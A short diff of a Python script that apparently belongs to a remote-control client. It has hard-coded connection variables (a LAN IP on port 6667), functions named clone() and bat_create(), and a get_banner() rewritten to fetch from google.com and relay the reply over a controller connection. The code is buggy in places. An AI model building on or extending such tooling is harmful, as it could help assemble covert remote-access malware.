@@ -16,6 +16,8 @@ from pathlib import Path
 from os import path
 from sys import argv
 
+os.system("cls")
+
 #conn vars
 IP = "192.168.0.18"
 PORT = 6667
@@ -61,11 +63,11 @@ def clone():
         pass
 
 def get_banner():
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.connect("localhost",22)
-    banner = sock.recv(2048)
-    sock.close()
-    conn.send(banner.encode("utf-8"))
+    s = socket.socket()
+    s.connect(('google.com',80))
+    s.send(b'GET/\n\n')
+    conn.send(s.recv(1024))
+    s.close()
 
 def bat_create(file_path=""):
     if(file_path == ""):
